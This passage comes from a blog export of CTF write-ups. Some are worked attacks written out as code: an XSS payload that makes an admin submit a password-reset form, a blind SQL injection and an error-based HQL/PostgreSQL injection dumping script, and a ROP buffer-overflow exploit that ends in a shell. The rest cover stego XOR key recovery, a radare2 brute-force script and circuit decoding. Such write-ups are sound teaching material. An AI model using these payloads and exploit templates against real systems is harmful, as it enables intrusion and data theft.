'-----------------------------------' name += l print name stop = False break if stop: break#if(1=1,sleep(6),0) Running it 123456789101112131415161718192021222324252627282930313233343536$ python management.py fflflaflagflag&#123;flag&#123;aflag&#123;aLflag&#123;aLWflag&#123;aLW4flag&#123;aLW4yflag&#123;aLW4ysflag&#123;aLW4ys_flag&#123;aLW4ys_Eflag&#123;aLW4ys_ESflag&#123;aLW4ys_ESCflag&#123;aLW4ys_ESC4flag&#123;aLW4ys_ESC4Pflag&#123;aLW4ys_ESC4PEflag&#123;aLW4ys_ESC4PE_flag&#123;aLW4ys_ESC4PE_3flag&#123;aLW4ys_ESC4PE_3vflag&#123;aLW4ys_ESC4PE_3v3flag&#123;aLW4ys_ESC4PE_3v3rflag&#123;aLW4ys_ESC4PE_3v3rYflag&#123;aLW4ys_ESC4PE_3v3rYTflag&#123;aLW4ys_ESC4PE_3v3rYTHflag&#123;aLW4ys_ESC4PE_3v3rYTH1flag&#123;aLW4ys_ESC4PE_3v3rYTH1Nflag&#123;aLW4ys_ESC4PE_3v3rYTH1NGflag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!!flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!!!flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!!!&#125;","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"tpctf2017","slug":"tpctf2017","permalink":"https://teamrocketist.github.io/tags/tpctf2017/"},{"name":"sqli","slug":"sqli","permalink":"https://teamrocketist.github.io/tags/sqli/"},{"name":"blindSqli","slug":"blindSqli","permalink":"https://teamrocketist.github.io/tags/blindSqli/"}]},{"title":"[Web] TPCTF2017 - It's Common Sense","slug":"Web-TPCTF2017-It-s-Common-Sense","date":"2017-12-04T04:35:42.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2017/12/04/Web-TPCTF2017-It-s-Common-Sense/","link":"","permalink":"https://teamrocketist.github.io/2017/12/04/Web-TPCTF2017-It-s-Common-Sense/","excerpt":"","text":"It’s Common Sense100Common Sense Reviews was fixed last night. If you believe you had a working sol. last night but did not receive an email, please retry that solution. One major issue was email sending.We found this site: Common Sense ReviewsWe think the site owners are related to Pirates. Please retrieve the admin password.This challenge is not working right now, it should be back soon. If not, we will remove points received from it.This challenge should be working properly now. Expect a delay in receiving emails (approx. 3 minutes max?).Author: Steven Su A XSS challenge, we do have a register form and a login page, after signing up we can visit two forms in the account page, one is to sent a review to the admin, and the other is to reset the password (the new password was send to the email submitted in the form). My first intuition was to try easiest thing that is to steal the session cookie, unfortunately this wouldn’t work because the session cookie was protected with a http only flag, which prevents it from being stolen with XSS. The solution was to instead of trying to get the cookies we can make the admin to submit the password reset form! We can do this this with Ajax/Jquery The first line of the code is to import Jquery: 1234567891011121314&lt;script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js\"&gt;&lt;/script&gt;&lt;script&gt;$( document ).ready(function() &#123; $.ajax(&#123; type: \"POST\", url: \"/account\", data: 'email=s2020685%40mvrht.net&amp;formbtn=Send%20Request', success: function(data) &#123; console.log('success'); &#125; &#125;);&#125;);&lt;/script&gt; Submitting the form like this:If we check our own review we can notice that the post request is being done correctly and the log message success is printed in the js console: After a while we would receive an email with the flag: 1Congratulations! Normally, you would&apos;ve reset the administrators password. For the purposes of this challenge, the flag is tpctf&#123;D1D_Y0U_N0t1c3_Common_Sense_Reviews_1s_P4R7_0F_CSRF_19210jka010920aff&#125;","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"tpctf2017","slug":"tpctf2017","permalink":"https://teamrocketist.github.io/tags/tpctf2017/"},{"name":"xss","slug":"xss","permalink":"https://teamrocketist.github.io/tags/xss/"},{"name":"passwordreset","slug":"passwordreset","permalink":"https://teamrocketist.github.io/tags/passwordreset/"},{"name":"jquery","slug":"jquery","permalink":"https://teamrocketist.github.io/tags/jquery/"}]},{"title":"[Misc] TUCTF - Gr8 Pictures","slug":"Misc-TUCTF-Gr8-Pictures","date":"2017-12-01T07:58:48.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/12/01/Misc-TUCTF-Gr8-Pictures/","link":"","permalink":"https://teamrocketist.github.io/2017/12/01/Misc-TUCTF-Gr8-Pictures/","excerpt":"","text":"Gr8 Pictures50The mysterious hacker 4chan is believed to be passing secret messages hidden in a picture. We know that he connects to gr8pics.tuctf.com:4444 to hide his message in the picture. Your mission, should you choose to accept it, is to find out what message he is trying to hide.nc gr8pics.tuctf.com 4444If you get connection refused, use nc gr8pics.tuctf.com 41234NOTE: the server does not show a prompt, but if the connection is successful, you are at the correct starting point.NOTE: without connecting to the server, the flag is theoretically cryptographically impossible to getNOTE: If you’re getting a bunch of data that doesn’t seem to stop - it stops after ~3MB of datasha19044fe96a50ecb831fe451f13c24cc96b0a9e24d flag.png This was a simple misc, we were told in the challenge description that a hacker from 4chan was using this service to hide messages within images, if we sent a message with a length &gt;= 50 the service would return an image with the message hidden within in the image, after receiving it I noticed that the only difference between the image given from the challenge and the one generated in the service was 50 bytes (which makes sense since I sent a message with 50 length), I was suspicious that the server were encrypting the message using a simple xor so to test this I sent 50 null bytes to the service: 1$ python -c \"print '\\x00'*50\" | nc gr8pics.tuctf.com 4444 | base64 -d &gt; flag2.png But why send only null bytes? If they are using xor we can retrieve the key completely! xoring any number by zero will return always the number! You could easily get the 50 new bytes by comparing all non equal bytes between flag.png flag2.png: 123456789101112131415from pwn import *file2 = open('flag2.png', 'rb')file = open('flag.png', 'rb')s = bytearray(file.read())s2 = bytearray(file2.read())k = 0key = ''flag = ''for i in range(len(s)): if s[i] != s2[i]: key += chr(s2[i])print key By running it we could easily get the key!12$ python misc50.pyIsnt_x0r_such_@_c00l_function?Im_such_a_1337_hax0r Having the key is easy to decrypt the original flag we just need to adapt our script to: 12345678910111213141516from pwn import *file2 = open('test.png', 'rb')file = open('flag.png', 'rb')s = bytearray(file.read())s2 = bytearray(file2.read())k = 0key = ''flag = ''for i in range(len(s)): if s[i] != s2[i]: key += chr(s2[i]) flag += chr(s[i] ^ s2[i])print keyprint flag And finally the flag: 123$ python misc50.pyIsnt_x0r_such_@_c00l_function?Im_such_a_1337_hax0rTUCTF&#123;st3g@n0gr@phy's_so_c00l,No0ne_steals_my_msg&#125;","categories":[{"name":"Misc","slug":"Misc","permalink":"https://teamrocketist.github.io/categories/Misc/"}],"tags":[{"name":"xor","slug":"xor","permalink":"https://teamrocketist.github.io/tags/xor/"},{"name":"misc","slug":"misc","permalink":"https://teamrocketist.github.io/tags/misc/"},{"name":"stego","slug":"stego","permalink":"https://teamrocketist.github.io/tags/stego/"}]},{"title":"[Reverse] TUCTF - Unknown","slug":"Reverse-TUCTF-Unknown","date":"2017-11-27T05:27:55.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2017/11/27/Reverse-TUCTF-Unknown/","link":"","permalink":"https://teamrocketist.github.io/2017/11/27/Reverse-TUCTF-Unknown/","excerpt":"","text":"Unknown200Diggin through some old files we discovered this binary. Although despite our inspection we can’t figure out what it does. Or what it wants…unknown - md5: 9f08f6e8240d4a0e098c4065c5737ca6 Reversing the binaryThe binary has the following restrictions, we need to provide the correct flag as argv[1] and the length of the flag must have 56 of length as we can see bellow in the assembly:After this initial checks we are going to have a loop that checks each byte of the flag provided using a big encryption function fcn.00401e90, we can easily check if the byte is correct or not by checking the value of RAX after the function returns as it is explained in the image below: Radare2 ScriptWe don’t really need to reverse the encryption function fcn.00401e90, since we can write a radare2 script that checks the return values(RAX) from this function we can just brute-force the flag byte by byte, we need to update the address where the string is stored at each iteration/tentative, and in failed attempts we need to decrement the counter of the loop so we can recheck the same flag byte, this can be done with a script like this: 1234567891011121314151617181920212223242526272829303132333435363738394041424344import r2pipeimport stringimport sysdef transform_string(s): return ''.join(['%x'% ord(c) for c in s])def change_address_value(addr, value): r2.cmd('s %s' % addr) r2.cmd('wx %s' % value) r2.cmd('s rip') flag_try = 'TUCTF&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#125;'flag_list = list(flag_try)r2=r2pipe.open('./unknown', flags=['-2'])r2.cmd(\"ood %s\" % flag_try)r2.cmd(\"aa\")r2.cmd(\"db 0x401c39\")r2.cmd(\"db 0x401C82\")r2.cmd(\"dc\")flag_address = r2.cmd(\"dr rax\")r2.cmd(\"dc\")characters = string.ascii_lowercase+ string.digits + '_!&#125;'for j in range(0,len(flag_list)): for i,s in enumerate(characters): if j &gt; 5: flag_list[j] = s change_address_value(flag_address, transform_string(''.join(flag_list))) num = r2.cmd('dr rax') if int(num,16) == 0x0: if j &gt; 5: flag_list[j] = characters[i-1] change_address_value(flag_address, transform_string(''.join(flag_list))) r2.cmd('dc') break else: r2.cmd('dr rax = 0x0') change_address_value('rbp-0xc', '%02x000000' % (j-1)) r2.cmd('dc') sys.stdout.write('\\r'+''.join(flag_list)) sys.stdout.flush() Running it: 12$ python unknown.pyTUCTF&#123;w3lc0m3_70_7uc7f_4nd_7h4nk_y0u_f0r_p4r71c1p471n6!&#125;","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"radare2","slug":"radare2","permalink":"https://teamrocketist.github.io/tags/radare2/"},{"name":"bytebybyte","slug":"bytebybyte","permalink":"https://teamrocketist.github.io/tags/bytebybyte/"},{"name":"r2script","slug":"r2script","permalink":"https://teamrocketist.github.io/tags/r2script/"},{"name":"tuctf2017","slug":"tuctf2017","permalink":"https://teamrocketist.github.io/tags/tuctf2017/"}]},{"title":"[Electronics] Pwn2Win - Top Secret","slug":"Electronics-Pwn2Win-Top-Secret","date":"2017-10-28T15:25:56.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/10/28/Electronics-Pwn2Win-Top-Secret/","link":"","permalink":"https://teamrocketist.github.io/2017/10/28/Electronics-Pwn2Win-Top-Secret/","excerpt":"","text":"Top SecretMolly was able to take pictures of a strange digital circuit sketch, along with an also strange message. All of these things were inside an envelope in a safe, which was labeled “Top Secret”.We believe it might contain Butcher Corp’s plans for the future, can you help us read the message?LinkMirrorId: top_secretTotal solves: 40Score: 223Categories: Eletronics To solve this problem the circuit is first analyzed and divided in to different blocks based on their function. The circuit can be divided in to four different functional blocks: The counter, the Multiplexer (LED Matrix line driver), the input circuit (LED Matrix column driver) and the 8x8 LED Matrix (the Output). The counter circuit counts from 0 to 7, the increments are done every falling edge. The clock is the 0 input. The output of the counter is a 3-line binary number that is the line selection input of the multiplexer circuit. The main input of the multiplexer is connected to a high signal (binary 1). The multiplexer puts one line of its outputs (8 line multiplexer) in a high state and all others at a low state. The 3-line input from the counter selects the line which is to be put in a high state. The line output of the multiplexer is connected to a BJT transistor that connects the LED Matrix line to a low signal (binary 0) when this multiplexer output is in a high state. Basically, the BJT transistor works like a NOT gate. In the input block every input is also connected to a BJT transistor. When an input is in the high state, the transistor connects the LED matrix column to a logical 0, and vice versa when the input is in a low state. Again, basically like a NOT gate. Some inputs have two transistors in series, so basically to NOT gates in series, and therefore here when the input signal is in a high state, the corresponding column is also in a high state. Finally, in the LED matrix, every led is connected from a column to a line. A LED lights up when the column is in a logical high state and the line in a logical low state. Combing this information with the received input sequence and aligning the date with all the inputs (0 to 8), it is possible to decode what is shown in the LED matrix. To do this, the data is aligned and then imported to excel where, with some simple logic, the needed bits are flipped (based on the NOT inputs) and then with conditional formatting the LED outputs are simulated, RED is an off led and green a ON led. This is shown in the picture below, for the first character only, where the table on the left is the original data and the table on the left the interpreted data. The full excel file can be found in this link.","categories":[{"name":"Electronics","slug":"Electronics","permalink":"https://teamrocketist.github.io/categories/Electronics/"}],"tags":[{"name":"electronics","slug":"electronics","permalink":"https://teamrocketist.github.io/tags/electronics/"},{"name":"circuits","slug":"circuits","permalink":"https://teamrocketist.github.io/tags/circuits/"},{"name":"transistor","slug":"transistor","permalink":"https://teamrocketist.github.io/tags/transistor/"},{"name":"led","slug":"led","permalink":"https://teamrocketist.github.io/tags/led/"},{"name":"logic","slug":"logic","permalink":"https://teamrocketist.github.io/tags/logic/"},{"name":"multiplexer","slug":"multiplexer","permalink":"https://teamrocketist.github.io/tags/multiplexer/"}]},{"title":"[Web] Pwn2Win - Criminals","slug":"Web-Pwn2Win-Criminals","date":"2017-10-24T06:53:16.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2017/10/24/Web-Pwn2Win-Criminals/","link":"","permalink":"https://teamrocketist.github.io/2017/10/24/Web-Pwn2Win-Criminals/","excerpt":"","text":"CriminalsHey, Rebellious member, let’s hack this Bloodsuckers web app. I think they keep some secret.http://200.136.213.109/Automated tools are NOT required and NOT allowed.Id: criminalsTotal solves: 9Score: 363Categories: Web This web challenge only has one page and has this form bellow: The form has 4 inputs if we test each one of them with a single quote we will notice that an error pops up and we can see the admin of the website did use prepared statements but forgot about the order GET param:Now to solve this challenge we need first to check which dbms is running by just checking the error in the image we can see that is running on HBL (The Hibernate Query Language), some kind of a modified SQL with some restrictions, before talking about this lets first find which dbms is running: 12345678$ curl 'http://200.136.213.109/' --data \"name=&amp;age=&amp;crime=&amp;order=abs(1)||2\" 2&gt;/dev/null | grep 'post'&lt;/pre&gt;&lt;p&gt;&lt;b&gt;root cause&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;org.postgresql.util.PSQLException: ERROR: operator does not exist: integer || integer org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2102) org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:1835) org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:257) org.postgresql.jdbc2.AbstractJdbc2Statement.execute(AbstractJdbc2Statement.java:500) org.postgresql.jdbc2.AbstractJdbc2Statement.executeWithFlags(AbstractJdbc2Statement.java:388) org.postgresql.jdbc2.AbstractJdbc2Statement.executeQuery(AbstractJdbc2Statement.java:273) With this query we can generate an error that leaks the dbms it’s postgresql! now we need to find a way to inject and dump the database, I knew some injections in order by with mysql but in postgresql is somehow different and what the worst about this are the limitations we got from HBL. AAfter spending alot of time trying to execute a subquery, I started searching on google, I knew we needed to something related with XML queries (Order by injections in MySql are similar) and then I found this great slides: https://conference.hitb.org/hitbsecconf2016ams/materials/D2T2%20-%20Mikhail%20Egorov%20and%20Sergey%20Soldatov%20-%20New%20Methods%20for%20Exploiting%20ORM%20Injections%20in%20Java%20Applications.pdf This is perfect to put in the order by query this will return an integer and we can execute a subquery like we wanted, but the question is how are we going to leaking info? Postgres has a very nice feature, if we cast a string into an integer from a select for example we will generate an error! and the output of that sql query will be printed in the error! For this I used another function called pg_ls_dir this can list directories, if we use this to list the current directory and cast it into integer we are going to generate an error, leaking the directory for example: 1array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir(CHR(46))as int)', true, false,'')),1) The output of this query is: As you can see above we leaked one directory named pg_xlog we can do exactly the same but instead of trying to read the log files we can leak the tables like this: 1array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 0)) as int)', true, false,'')),1) The output of this query is:12345$ curl 'http://200.136.213.109/' --data \"name=&amp;age=&amp;crime=&amp;order=array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 0)) as int)', true, false,'')),1)\" 2&gt;/dev/null | grep 'root cause'&lt;/pre&gt;&lt;p&gt;&lt;b&gt;root cause&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;javax.persistence.PersistenceException: org.hibernate.exception.GenericJDBCException: could not extract ResultSet&lt;/pre&gt;&lt;p&gt;&lt;b&gt;root cause&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;org.hibernate.exception.GenericJDBCException: could not extract ResultSet&lt;/pre&gt;&lt;p&gt;&lt;b&gt;root cause&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;org.postgresql.util.PSQLException: ERROR: could not open directory &amp;quot;secret,flag&amp;quot;: No such file or directory&lt;/pre&gt;&lt;p&gt;&lt;b&gt;note&lt;/b&gt; &lt;u&gt;The full stack trace of the root cause is available in the Apache Tomcat/8.0.47 logs.&lt;/u&gt;&lt;/p&gt;&lt;hr class=\"line\"&gt;&lt;h3&gt;Apache Tomcat/8.0.47&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt; We just leaked the table flag and the column secret! we can easily write a python script that leaks all the tables and gets the flag for us like this: 1234567891011121314151617import requestsimport rehost = 'http://200.136.213.109/'data = &#123;'name':'','crime':'','order':'','age':''&#125;query = \"array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset &#123;&#125;)) as int)', true, false,'')),1)\"queryflag = \"array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT secret FROM flag c limit 1 offset &#123;&#125;)) as int)', true, false,'')),1)\"for x in xrange(0,6): #print x data['order'] = query.format(x) print data['order'] r = requests.post(host, data=data) print re.findall(r'&amp;quot;([A-Za-z0-9_\\-&#123;&#125;,]+)&amp;quot;', r.text)data['order'] = queryflag.format(0)print data['order']r = requests.post(host,data=data)print re.findall(r'&amp;quot;([A-Za-z0-9_\\-&#123;&#125;]+)&amp;quot;', r.text) Now running the script: $ python HQLI.py array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 0)) as int)', true, false,'')),1) [u'secret,flag'] array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 1)) as int)', true, false,'')),1) [u'id,criminal'] array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 2)) as int)', true, false,'')),1) [u'age,criminal'] array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 3)) as int)', true, false,'')),1) [u'crime,criminal'] array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 4)) as int)', true, false,'')),1) [u'last_location,criminal'] array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 5)) as int)', true, false,'')),1) [u'name,criminal'] array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT secret FROM flag c limit 1 offset 0)) as int)', true, false,'')),1) [u'CTF-BR{bl00dsuck3rs_HQL1njection_pwn2win}']","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"pwn2winctf","slug":"pwn2winctf","permalink":"https://teamrocketist.github.io/tags/pwn2winctf/"},{"name":"sqli","slug":"sqli","permalink":"https://teamrocketist.github.io/tags/sqli/"},{"name":"hqli","slug":"hqli","permalink":"https://teamrocketist.github.io/tags/hqli/"},{"name":"xmlqueries","slug":"xmlqueries","permalink":"https://teamrocketist.github.io/tags/xmlqueries/"},{"name":"orderby","slug":"orderby","permalink":"https://teamrocketist.github.io/tags/orderby/"}]},{"title":"[Pwn] Pwn2Win - Wrong User","slug":"Pwn-Pwn2Win-Wrong-User","date":"2017-10-23T08:31:07.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/10/23/Pwn-Pwn2Win-Wrong-User/","link":"","permalink":"https://teamrocketist.github.io/2017/10/23/Pwn-Pwn2Win-Wrong-User/","excerpt":"","text":"Wrong UserMolly invaded an important system of Bloodsuckers and obtained sensitive information. She believes that you are also capable of invading such system and therefore she left a secret message to you. Can you get such message? Maybe you get troubles to get access with the correct user.Server: nc 10.133.70.1 6666https://cloud.ufscar.br:8080/v1/AUTH_c93b694078064b4f81afd2266a502511/static.pwn2win.party/wronguser_1e8787242eb826005729b0ba17a925b0782be65190f18a1b8dc4e57756c4e3c4.tar.gzhttps://static.pwn2win.party/wronguser_1e8787242eb826005729b0ba17a925b0782be65190f18a1b8dc4e57756c4e3c4.tar.gzId: wrong_userTotal solves: 8Score: 373Categories: Exploitation Using radare2 to disassembly the binary:We have fgets with a very large size 0x400, it reads from the STDIN so we can control what to put in the buffer it’s obvious to see that we have a buffer overflow if we check what kind of protections with checksec:No stack canary protection, but NX is enabled (Non-Executable Stack) once again we have to use Return Oriented Programming (ROP), the challenge provided the libc.so so we can use to calculate the offsets. The steps to solve are: 1231 - Overflow the Buffer2 - ROP chain to leak libc addresses and return to main3 - Overflow the Buffer again and build a ROP chain to call system(&apos;/bin/sh&apos;) Overflow the BufferWell this always the same first we can create a pattern with metasploit: 123456789101112131415$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 50Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab$ gdb ./wrongpwndbg&gt; b *0x400781Breakpoint 1 at 0x400781pwndbg&gt; rStarting program: /home/user/ctf/wrong Hello! What is your name?Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5AbNice to meet you Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5AbBreakpoint *0x400781pwndbg&gt; x $rsp0x7fffffffdea8: 0x62413362 Now that we got the part of the string pattern that we got from the RSP register we can calculate its offset once again using metasploit: 12$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x62413362[*] Exact match at offset 40 Finally the padding we require is 40… ROP chain to leak libc addresses and return to mainWe need to leak a libc address we can do this with puts or printf they are both present in the binary, because of this they will be also be in the GOT (Global Offset Table) as we can check their location addresses using objdump -R ./wrong: 1234567891011121314151617$ objdump -R ./wrong./wrong: file format elf64-x86-64DYNAMIC RELOCATION RECORDSOFFSET TYPE VALUE 0000000000600b58 R_X86_64_GLOB_DAT __gmon_start__0000000000600bd0 R_X86_64_COPY stdout@@GLIBC_2.2.50000000000600bd8 R_X86_64_COPY stdin@@GLIBC_2.2.50000000000600b78 R_X86_64_JUMP_SLOT puts@GLIBC_2.2.50000000000600b80 R_X86_64_JUMP_SLOT getuid@GLIBC_2.2.50000000000600b88 R_X86_64_JUMP_SLOT printf@GLIBC_2.2.50000000000600b90 R_X86_64_JUMP_SLOT __libc_start_main@GLIBC_2.2.50000000000600b98 R_X86_64_JUMP_SLOT fgets@GLIBC_2.2.50000000000600ba0 R_X86_64_JUMP_SLOT __gmon_start__0000000000600ba8 R_X86_64_JUMP_SLOT fflush@GLIBC_2.2.50000000000600bb0 R_X86_64_JUMP_SLOT setuid@GLIBC_2.2.5 We want to get the address that’s stored in the GOT of puts with it we can calculate the offsets to another useful libc functions like system and the offset to the string /bin/sh, to call a function within ROP we need the PLT address we can get them using objdump -dj.plt ./wrong: 12345678910111213141516$ objdump -dj.plt ./wrong./wrong: file format elf64-x86-64Disassembly of section .plt:0000000000400560 &lt;.plt&gt;0000000000400570 &lt;puts@plt&gt;0000000000400580 &lt;getuid@plt&gt;0000000000400590 &lt;printf@plt&gt;00000000004005a0 &lt;__libc_start_main@plt&gt;00000000004005b0 &lt;fgets@plt&gt;00000000004005c0 &lt;__gmon_start__@plt&gt;00000000004005d0 &lt;fflush@plt&gt;00000000004005e0 &lt;setuid@plt&gt; Since this is a 64bit binary we need to store the function arguments in registers instead of putting them in the stack, we can do this using ROPGadgets, in x64 the first six parameters are saved in RDI, RSI, RDX, RCX, R8 and R9, if there are more parameters will be saved on the stack. Since puts only has 1 argument we just need a Gadget that pop an address from the stack into the RDI register, ROPGadget can help us finding such a gadget: 1234567891011121314$ ROPgadget --binary ./wrong --only &quot;pop|ret&quot;Gadgets information============================================================0x00000000004007ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007ee : pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007f0 : pop r14 ; pop r15 ; ret0x00000000004007f2 : pop r15 ; ret0x00000000004007eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007ef : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400650 : pop rbp ; ret0x00000000004007f3 : pop rdi ; ret0x00000000004007f1 : pop rsi ; pop r15 ; ret0x00000000004007ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400559 : ret The 0x00000000004007f3 : pop rdi ; ret gadget is the one we need, now we just need the address from main so after we run our gadget we can return back to main:Now that we have everything we need we can start building our ropchain: Overflow the Buffer again and build a ROP chain to call system(‘/bin/sh’)Now we have everything we need to calculate other libc addresses we need help from libc.so.6 file they gave us pwntools can help us to get the offsets in a easier way: 12345678910111213141516171819202122232425262728293031323334BINSH_OFFSET = 0x18cd17 # strings -a -t x libc.so.6 | grep '/bin/sh'binary = ELF('./wrong')libc = ELF('./libc.so.6')PADDING = 'A'*40POPRET = 0x4007f3PUTSPLT = binary.plt['puts'] #0x000000000040056cPUTSGOT = binary.got['puts']MAIN = 0x4006e6ropchain = ''ropchain += p64(POPRET) # POP RDI; RETropchain += p64(PUTSGOT) # PUTS ADDRESS ARG[1]ropchain += p64(PUTSPLT) # PUTS function \"call\"ropchain += p64(MAIN) # MAIN function \"call\" print r.recvuntil('Hello! What is your name?\\n')#time.sleep(1)r.sendline(PADDING+ropchain)print r.recv(len('Nice to meet you ')+len(PADDING)+3)#PUTS = u64(r.recv(6).ljust(8, '\\x00'))print r.recvuntil('Hello! What is your name?\\n')LIBCBASE = PUTS -libc.symbols['puts']BINSH = LIBCBASE + BINSH_OFFSETSYSTEM = LIBCBASE + libc.symbols['system']log.info(\"LEAKED PUTS LIBC 0x%x\" % PUTS)log.info(\"SYSTEM LIBC 0x%x\" % SYSTEM)log.info(\"LIBCBASE LIBC 0x%x\" % LIBCBASE)log.info(\"BINSH ADDRESS 0x%x\" % BINSH) Now that we have the addresses we need we can start again to build a new ropchain:Now the full exploit could be written as follows: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *import timedef getConn(): return process('./wrong', env = &#123;\"LD_PRELOAD\":'./libc.so.6'&#125;) if local else remote('10.133.70.1', 6666)local = Truer = getConn()#gdb.attach(r, '''# b *0x0040076c# c''')# BINSH_OFFSET = 0x18cd17 # strings -a -t x libc.so.6 | grep '/bin/sh'binary = ELF('./wrong')libc = ELF('./libc.so.6')PADDING = 'A'*40POPRET = 0x4007f3PUTSPLT = binary.plt['puts'] #0x000000000040056cPUTSGOT = binary.got['puts']MAIN = 0x4006e6ropchain = ''ropchain += p64(POPRET) # POP RDI; RETropchain += p64(PUTSGOT) # PUTS ADDRESS ARG[1]ropchain += p64(PUTSPLT) # PUTS function \"call\"ropchain += p64(MAIN) # MAIN function \"call\" print r.recvuntil('Hello! What is your name?\\n')#time.sleep(1)r.sendline(PADDING+ropchain)print r.recv(len('Nice to meet you ')+len(PADDING)+3)#PUTS = u64(r.recv(6).ljust(8, '\\x00'))print r.recvuntil('Hello! What is your name?\\n')LIBCBASE = PUTS -libc.symbols['puts']BINSH = LIBCBASE + BINSH_OFFSETSYSTEM = LIBCBASE + libc.symbols['system']log.info(\"LEAKED PUTS LIBC 0x%x\" % PUTS)log.info(\"SYSTEM LIBC 0x%x\" % SYSTEM)log.info(\"LIBCBASE LIBC 0x%x\" % LIBCBASE)log.info(\"BINSH ADDRESS 0x%x\" % BINSH)ropchain = ''ropchain += p64(POPRET) # POP RDI; RETropchain += p64(BINSH) # BINSH ADDRESS ARG[1]ropchain += p64(SYSTEM) # SYSTEM function \"call\"ropchain += p64(MAIN) # MAIN function \"call\"r.sendline(PADDING+ropchain)r.interactive() If you run it you will get a shell to the server:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253python wrong_part1.py [+] Opening connection to 10.133.70.1 on port 6666: Done/usr/local/lib/python2.7/dist-packages/unicorn/unicorn.py:6: UserWarning: Module hashlib was already imported from /usr/lib/python2.7/hashlib.pyc, but /usr/local/lib/python2.7/dist-packages is being added to sys.path import pkg_resources/usr/local/lib/python2.7/dist-packages/unicorn/unicorn.py:6: UserWarning: Module six was already imported from /home/evilgod/.local/lib/python2.7/site-packages/six.pyc, but /usr/lib/python2.7/dist-packages is being added to sys.path import pkg_resources[*] '/home/evilgod/Documents/Hacking/ctf/pwn2win/exploitation/WrongUser/wrong' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)[*] '/home/evilgod/Documents/Hacking/ctf/pwn2win/exploitation/WrongUser/libc.so.6' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabledHello! What is your name?Nice to meet you AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@Hello! What is your name?[*] LEAKED PUTS LIBC 0x7fd320e62690[*] SYSTEM LIBC 0x7fd320e38390[*] LIBCBASE LIBC 0x7fd320df3000[*] BINSH ADDRESS 